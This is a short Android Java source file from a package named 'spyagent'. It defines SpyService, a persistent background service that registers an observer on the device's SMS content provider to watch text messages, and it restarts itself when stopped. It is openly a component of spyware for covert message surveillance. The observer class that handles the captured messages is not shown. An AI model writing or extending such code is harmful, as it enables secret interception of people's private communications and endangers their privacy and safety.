package com.irodyk.spyagent;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.irodyk.spyagent.control.sms.SmsObserver;

/**
 * Created by i.rodyk on 8/29/16.
 */
public class SpyService extends Service {


    @Override
    public void onCreate() {
        super.onCreate();

        final Uri SMS_STATUS_URI = Uri.parse("content://sms");
        SmsObserver smsSentObserver = new SmsObserver(new Handler(), this);
        this.getContentResolver().registerContentObserver(SMS_STATUS_URI, true, smsSentObserver);
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
